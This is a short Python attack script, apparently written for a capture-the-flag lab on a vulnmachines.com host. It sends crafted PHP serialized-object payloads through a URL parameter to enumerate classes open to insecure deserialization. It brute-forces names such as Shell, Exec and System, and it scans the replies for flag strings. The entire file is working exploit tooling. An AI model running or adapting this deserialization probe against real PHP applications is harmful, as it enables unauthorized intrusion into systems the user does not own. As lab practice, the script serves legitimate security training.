#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

def check_class(classname):
    # Crear payload con clase personalizada
    payload = f'O:{len(classname)}:"{classname}":0:{{}}'
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        
        # Buscar errores que indiquen que la clase existe o no
        if "Class" in response.text and classname in response.text:
            return "EXISTS"
        
        # Buscar flags
        flag_patterns = [
            r'flag{[^}]+}',
            r'FLAG{[^}]+}',
            r'vulnmachines{[^}]+}',
            r'[a-fA-F0-9]{32}',
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, response.text)
            if matches:
                return f"FLAG: {matches[0]}"
                
        # Ver si hay algún output diferente
        if "fatal error" in response.text.lower():
            return "FATAL"
        elif "warning" in response.text.lower():
            return "WARNING"
            
    except:
        return None
    
    return None

# Probar nombres de clases comunes en CTFs
class_names = [
    "Flag", "FLAG", "flag",
    "ReadFlag", "GetFlag", "ShowFlag",
    "FileReader", "File", "ReadFile",
    "Challenge", "Lab", "Lab1",
    "Vuln", "VulnClass", "Vulnerable",
    "User", "Admin", "Administrator",
    "Debug", "Logger", "Log",
    "Database", "DB", "MySQL",
    "Config", "Configuration", "Settings",
    "SecOps", "VulnMachines", "VM",
    "Exploit", "Payload", "Shell",
    "Command", "Exec", "System",
    "Reader", "Writer", "Handler"
]

print("[*] Discovering available classes...")
for cls in class_names:
    result = check_class(cls)
    if result:
        print(f"[+] {cls}: {result}")
        if "FLAG" in result:
            print(f"\n[!!!] FLAG FOUND WITH CLASS: {cls}")
            break